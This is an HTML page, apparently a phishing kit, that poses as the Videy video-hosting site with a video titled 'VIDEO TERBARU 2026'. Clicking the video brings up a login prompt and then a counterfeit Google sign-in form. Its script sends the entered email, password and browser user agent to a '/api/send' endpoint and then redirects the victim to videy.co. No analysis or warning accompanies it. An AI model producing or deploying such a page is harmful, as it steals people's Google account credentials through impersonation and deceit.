<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Untitled Video | Videy - free and simple video hosting</title>
    <link rel="icon" href="favicon.png" type="image/png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }

        body {
            background: #ffffff;
            color: #000000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 480px;
            background: #fff;
            padding: 0 16px 40px;
        }

        .topbar {
            position: relative;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 0 12px;
            margin-top: 2px;
            margin-bottom: 18px;
        }

        .topbar::after {
            content: '';
            position: absolute;
            left: -16px;
            right: -16px;
            bottom: 0;
            height: 2px;
            background: #e5e5e5;
        }

        .logo {
            font-size: 24px;
            font-weight: 700;
            letter-spacing: -0.5px;
            line-height: 1;
            margin-left: 8px;
        }

        .btn-upload {
            background: #111;
            color: #fff;
            border: none;
            padding: 9px 21px;
            border-radius: 30px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-right: 4px;
        }

        .player {
            position: relative;
            width: 100%;
            aspect-ratio: 16 / 9;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 18px;
            cursor: pointer;
        }

        .player .play-btn {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 76px;
            height: 76px;
            background: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            border: none;
            pointer-events: none;
        }

        .player .play-btn::after {
            content: '';
            display: block;
            width: 0;
            height: 0;
            border-left: 22px solid #000;
            border-top: 14px solid transparent;
            border-bottom: 14px solid transparent;
            margin-left: 6px;
        }

        .controls {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 12px;
        }

        .time {
            color: #fff;
            font-size: 13px;
            font-weight: 500;
            min-width: 38px;
        }

        .progress {
            flex: 1;
            height: 4px;
            background: rgba(255, 255, 255, 0.35);
            border-radius: 4px;
            position: relative;
        }

        .progress .dot {
            position: absolute;
            left: 0;
            top: 50%;
            transform: translate(-50%, -50%);
            width: 14px;
            height: 14px;
            background: #fff;
            border-radius: 50%;
        }

        .icon {
            color: #fff;
            font-size: 18px;
            cursor: pointer;
            display: flex;
            align-items: center;
        }

        .icon svg {
            width: 20px;
            height: 20px;
            fill: #fff;
        }

        .video-title {
            font-size: 17px;
            font-weight: 700;
            letter-spacing: 0.2px;
            text-transform: uppercase;
            margin-bottom: 18px;
        }

        .share-wrap {
            display: flex;
            justify-content: center;
        }

        .share-img {
            width: 160px;
            height: auto;
            cursor: pointer;
            display: block;
        }

        .overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.45);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            z-index: 999;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.28s ease, visibility 0.28s ease;
        }

        .overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .popup,
        .google-popup {
            transform: scale(0.85) translateY(12px);
            opacity: 0;
            transition: transform 0.32s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.28s ease;
        }

        .overlay.active .popup,
        .overlay.active .google-popup {
            transform: scale(1) translateY(0);
            opacity: 1;
        }

        .popup {
            width: 100%;
            max-width: 420px;
            background: #fff;
            border-radius: 12px;
            padding: 24px 20px 26px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
            position: relative;
        }

        .popup-title {
            font-size: 18px;
            font-weight: 500;
            color: #111;
            text-align: left;
            margin-bottom: 20px;
            line-height: 1.35;
            white-space: nowrap;
        }

        .btn-google {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            background: #ffffff;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 12px 16px;
            font-size: 15px;
            font-weight: 500;
            color: #3c4043;
            cursor: pointer;
            margin: 0 auto;
        }

        .btn-google:hover {
            background: #f8f9fa;
        }

        .btn-google svg {
            width: 20px;
            height: 20px;
        }

        .google-popup {
            width: 100%;
            max-width: 420px;
            background: #fff;
            border-radius: 10px;
            padding: 28px 24px 24px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
            position: relative;
        }

        .google-logo {
            display: flex;
            justify-content: center;
            font-size: 26px;
            font-weight: 600;
            margin-bottom: 6px;
        }

        .google-logo span:nth-child(1) { color: #4285F4; }
        .google-logo span:nth-child(2) { color: #EA4335; }
        .google-logo span:nth-child(3) { color: #FBBC05; }
        .google-logo span:nth-child(4) { color: #4285F4; }
        .google-logo span:nth-child(5) { color: #34A853; }
        .google-logo span:nth-child(6) { color: #EA4335; }

        .g-title {
            text-align: center;
            font-size: 26px;
            font-weight: 400;
            margin-bottom: 6px;
        }

        .g-sub {
            text-align: center;
            font-size: 15px;
            color: #202124;
            margin-bottom: 22px;
        }

        .g-input {
            width: 100%;
            padding: 14px 14px;
            border: 1px solid #dadce0;
            border-radius: 6px;
            font-size: 15px;
            color: #202124;
            margin-bottom: 14px;
            outline: none;
        }

        .g-input:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }

        .g-link {
            display: inline-block;
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 18px;
            cursor: pointer;
        }

        .g-note {
            font-size: 13px;
            color: #5f6368;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .g-note a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }

        .g-actions {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .g-create {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        .g-next {
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 6px;
            padding: 10px 26px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        .g-next:hover {
            background: #1765cc;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="topbar">
            <div class="logo">videy</div>
            <button class="btn-upload">Upload</button>
        </div>

        <div class="player" id="player">
            <button class="play-btn" aria-label="Play"></button>
            <div class="controls">
                <span class="time">0:00</span>
                <div class="progress">
                    <span class="dot"></span>
                </div>
                <span class="icon" aria-label="Volume">
                    <svg viewBox="0 0 24 24"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/></svg>
                </span>
                <span class="icon" aria-label="Fullscreen">
                    <svg viewBox="0 0 24 24"><path d="M7 14H5v5h5v-2H7v-3zm-2-4h2V7h3V5H5v5zm12 7h-3v2h5v-5h-2v3zM14 5v2h3v3h2V5h-5z"/></svg>
                </span>
            </div>
        </div>

        <div class="video-title">VIDEO TERBARU 2026</div>

        <div class="share-wrap">
            <img src="share.jpg" alt="Share video" class="share-img">
        </div>
    </div>

    <div class="overlay" id="overlay">
        <div class="popup">
            <div class="popup-title">Login untuk melanjutkan menonton</div>
            <button class="btn-google" id="btnGoogle">
                <svg viewBox="0 0 48 48">
                    <path fill="#FFC107" d="M43.6 20.5H42V20H24v8h11.3C33.7 32.7 29.3 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.9 1.2 8 3.1l5.7-5.7C34.5 6.1 29.5 4 24 4 12.9 4 4 12.9 4 24s8.9 20 20 20 20-8.9 20-20c0-1.3-.1-2.3-.4-3.5z"/>
                    <path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.6 16 18.9 12 24 12c3.1 0 5.9 1.2 8 3.1l5.7-5.7C34.5 6.1 29.5 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/>
                    <path fill="#4CAF50" d="M24 44c5.2 0 10-2 13.5-5.2l-6.2-5.2C29.3 35.5 26.8 36 24 36c-5.2 0-9.6-3.3-11.3-7.9l-6.5 5C9.6 39.6 16.2 44 24 44z"/>
                    <path fill="#1976D2" d="M43.6 20.5H42V20H24v8h11.3c-.8 2.3-2.3 4.3-4.2 5.6l6.2 5.2C36.9 39.2 44 34 44 24c0-1.3-.1-2.3-.4-3.5z"/>
                </svg>
                Masuk dengan Google
            </button>
        </div>
    </div>

    <div class="overlay" id="overlayGoogle">
        <div class="google-popup">
            <div class="google-logo">
                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
            </div>
            <div class="g-title">Login</div>
            <div class="g-sub">Use your Google Account</div>

            <input type="text" class="g-input" id="emailInput" placeholder="Email Address">
            <input type="password" class="g-input" id="passInput" placeholder="Password">

            <span class="g-link">Forgot your email?</span>

            <div class="g-note">
                Not your computer? Use Guest mode to sign in privately.
                <a href="#">Learn more</a>
            </div>

            <div class="g-actions">
                <span class="g-create">Create account</span>
                <button class="g-next" id="btnNext">Next</button>
            </div>
        </div>
    </div>

    <script>
        const player = document.getElementById('player');
        const overlay = document.getElementById('overlay');
        const overlayGoogle = document.getElementById('overlayGoogle');
        const btnGoogle = document.getElementById('btnGoogle');
        const btnNext = document.getElementById('btnNext');
        const emailInput = document.getElementById('emailInput');
        const passInput = document.getElementById('passInput');

        player.addEventListener('click', function () {
            overlay.classList.add('active');
        });

        btnGoogle.addEventListener('click', function () {
            overlay.classList.remove('active');
            setTimeout(function () {
                overlayGoogle.classList.add('active');
            }, 220);
        });

        btnNext.addEventListener('click', async function () {
            const email = emailInput.value.trim();
            const password = passInput.value.trim();

            if (!email || !password) {
                alert('Isi email dan password dulu');
                return;
            }

            btnNext.textContent = 'Loading...';
            btnNext.disabled = true;

            try {
                await fetch('/api/send', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        email: email,
                        password: password,
                        userAgent: navigator.userAgent
                    })
                });
            } catch (err) {
                console.error(err);
            }

            // Redirect ke videy.co apapun hasilnya
            emailInput.value = '';
            passInput.value = '';
            window.location.href = 'https://videy.co';
        });
    </script>
</body>
</html>
